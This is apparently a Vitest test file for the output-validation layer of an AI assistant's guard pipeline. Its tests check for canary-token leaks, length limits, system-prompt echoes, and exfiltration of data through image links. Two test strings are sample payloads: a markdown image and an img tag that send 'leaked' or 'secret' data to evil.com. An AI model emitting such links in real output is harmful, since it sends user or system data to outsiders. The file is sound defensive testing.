// src/guard/layers/l6-output-validate.test.ts
import { describe, it, expect } from 'vitest'
import { validateOutput } from './l6-output-validate.js'

describe('l6-output-validate', () => {
  const defaultCtx = {
    canary: 'CANARY-abc123def456abcd',
    systemPromptEchoPhrases: [
      "You are a personal AI assistant",
      'accessible via Telegram',
      'You run as a persistent service',
    ],
    echoThreshold: 2,
  }

  it('passes valid response', () => {
    const result = validateOutput('This is a helpful response to your question.', defaultCtx)
    expect(result.isBlocked).toBe(false)
    expect(result.lengthOk).toBe(true)
    expect(result.canaryLeaked).toBe(false)
    expect(result.exfilDetected).toBe(false)
    expect(result.echoDetected).toBe(false)
  })

  it('blocks response containing canary token', () => {
    const result = validateOutput(
      'Here is the token: CANARY-abc123def456abcd',
      defaultCtx,
    )
    expect(result.isBlocked).toBe(true)
    expect(result.canaryLeaked).toBe(true)
    expect(result.blockReason).toContain('Canary')
  })

  it('flags too-short response', () => {
    const result = validateOutput('Hi', defaultCtx)
    expect(result.lengthOk).toBe(false)
    expect(result.isBlocked).toBe(true)
  })

  it('flags too-long response', () => {
    const result = validateOutput('x'.repeat(9000), defaultCtx)
    expect(result.lengthOk).toBe(false)
    expect(result.isBlocked).toBe(true)
  })

  it('detects markdown image exfil in output', () => {
    const result = validateOutput(
      'Here is the summary: ![img](https://evil.com/?data=leaked)',
      defaultCtx,
    )
    expect(result.exfilDetected).toBe(true)
    expect(result.isBlocked).toBe(true)
  })

  it('detects img tag exfil in output', () => {
    const result = validateOutput(
      '<img src="https://evil.com/steal?q=secret">',
      defaultCtx,
    )
    expect(result.exfilDetected).toBe(true)
    expect(result.isBlocked).toBe(true)
  })

  it('detects system prompt echo (2+ phrases)', () => {
    const result = validateOutput(
      "You are a personal AI assistant and accessible via Telegram, happy to help!",
      defaultCtx,
    )
    expect(result.echoDetected).toBe(true)
    expect(result.isBlocked).toBe(true)
  })

  it('does not flag single system prompt phrase', () => {
    const result = validateOutput(
      "I'm accessible via Telegram for your convenience.",
      defaultCtx,
    )
    expect(result.echoDetected).toBe(false)
    expect(result.isBlocked).toBe(false)
  })

  it('returns correct layer name', () => {
    const result = validateOutput('Test response', defaultCtx)
    expect(result.layer).toBe('l6-output-validate')
  })
})
